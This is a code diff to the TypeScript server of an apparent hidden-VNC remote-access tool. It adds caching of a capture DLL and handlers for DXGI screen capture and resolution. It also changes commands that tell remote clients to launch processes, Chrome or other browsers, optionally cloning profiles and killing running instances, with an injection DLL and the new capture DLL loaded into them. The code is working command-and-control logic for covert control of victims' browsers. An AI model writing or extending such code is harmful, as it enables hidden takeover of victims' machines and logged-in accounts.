@@ -17,6 +17,10 @@ let _cachedInjectionDll: Uint8Array | null = null;
 let _dllCachePath: string | null = null;
 let _dllCacheMtimeMs: number = 0;
 
+let _cachedCaptureDll: Uint8Array | null = null;
+let _captureDllCachePath: string | null = null;
+let _captureDllCacheMtimeMs: number = 0;
+
 function getInjectionDllBytes(): Uint8Array | null {
   const runtimeRoot = resolveRuntimeRoot();
   const candidates = [
@@ -58,6 +62,49 @@ function getInjectionDllBytes(): Uint8Array | null {
   }
 
   logger.warn(`[hvnc] injection DLL not found. Checked: ${candidates.join(", ")}`);
+  return null;
+}
+
+function getCaptureDllBytes(): Uint8Array | null {
+  const runtimeRoot = resolveRuntimeRoot();
+  const candidates = [
+    path.resolve(runtimeRoot, "dist-clients", "HVNCCapture.x64.dll"),
+    path.resolve(process.cwd(), "dist-clients", "HVNCCapture.x64.dll"),
+    path.resolve(import.meta.dir, "../../dist-clients/HVNCCapture.x64.dll"),
+  ];
+
+  if (_captureDllCachePath) {
+    try {
+      const { statSync } = require("fs");
+      const st = statSync(_captureDllCachePath);
+      if (st.mtimeMs === _captureDllCacheMtimeMs && _cachedCaptureDll) {
+        return _cachedCaptureDll;
+      }
+      _cachedCaptureDll = new Uint8Array(readFileSync(_captureDllCachePath));
+      _captureDllCacheMtimeMs = st.mtimeMs;
+      logger.info(`[hvnc] reloaded capture DLL from ${_captureDllCachePath} (${_cachedCaptureDll.length} bytes)`);
+      return _cachedCaptureDll;
+    } catch {
+      _captureDllCachePath = null;
+      _cachedCaptureDll = null;
+    }
+  }
+
+  for (const dllPath of candidates) {
+    if (!existsSync(dllPath)) continue;
+    try {
+      const { statSync } = require("fs");
+      const st = statSync(dllPath);
+      _cachedCaptureDll = new Uint8Array(readFileSync(dllPath));
+      _captureDllCachePath = dllPath;
+      _captureDllCacheMtimeMs = st.mtimeMs;
+      logger.info(`[hvnc] loaded capture DLL from ${dllPath} (${_cachedCaptureDll.length} bytes)`);
+      return _cachedCaptureDll;
+    } catch {
+      continue;
+    }
+  }
+
   return null;
 }
 
@@ -563,6 +610,17 @@ export function handleHVNCLookupResult(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCDXGIStatus(clientId: string, payload: any) {
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "hvnc_dxgi_status",
+      success: !!payload.success,
+      gpuPid: Number(payload.gpuPid) || 0,
+      message: String(payload.message || ""),
+    });
+  }
+}
+
 export function handleClipboardContent(clientId: string, payload: any) {
   const text = String(payload.text || "");
   const source = String(payload.source || "");
@@ -757,6 +815,14 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "hvnc_enable_cursor":
       if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_cursor", { enabled: !!payload.enabled });
       break;
+    case "hvnc_enable_dxgi":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_dxgi", { enabled: !!payload.enabled });
+      break;
+    case "hvnc_set_resolution": {
+      const maxHeight = Number(payload.maxHeight) || 0;
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_set_resolution", { maxHeight });
+      break;
+    }
     case "hvnc_mouse_move":
       if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_move", { x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
       break;
@@ -799,12 +865,15 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
         break;
       }
-      sendHVNCCommand(target, "hvnc_start_process_injected", {
+      const captureDll = getCaptureDllBytes();
+      const cmdPayload: Record<string, any> = {
         path: String(payload.path || ""),
         search_path: String(payload.search_path || ""),
         replace_path: String(payload.replace_path || ""),
         dll: dllData,
-      });
+      };
+      if (captureDll) cmdPayload.capture_dll = captureDll;
+      sendHVNCCommand(target, "hvnc_start_process_injected", cmdPayload);
       break;
     }
     case "hvnc_start_chrome_injected": {
@@ -814,10 +883,13 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
         break;
       }
-      sendHVNCCommand(target, "hvnc_start_chrome_injected", {
+      const captureDllChrome = getCaptureDllBytes();
+      const chromeCmdPayload: Record<string, any> = {
         path: String(payload.path || ""),
         dll: dllData,
-      });
+      };
+      if (captureDllChrome) chromeCmdPayload.capture_dll = captureDllChrome;
+      sendHVNCCommand(target, "hvnc_start_chrome_injected", chromeCmdPayload);
       break;
     }
     case "hvnc_start_browser_injected": {
@@ -827,14 +899,17 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
         break;
       }
-      sendHVNCCommand(target, "hvnc_start_browser_injected", {
+      const captureDllBrowser = getCaptureDllBytes();
+      const browserCmdPayload: Record<string, any> = {
         browser: String(payload.browser || ""),
         path: String(payload.path || ""),
         clone: payload.clone !== false,
         cloneLite: payload.cloneLite === true,
         killIfRunning: payload.killIfRunning === true,
         dll: dllData,
-      });
+      };
+      if (captureDllBrowser) browserCmdPayload.capture_dll = captureDllBrowser;
+      sendHVNCCommand(target, "hvnc_start_browser_injected", browserCmdPayload);
       break;
     }
     case "clipboard_sync": {
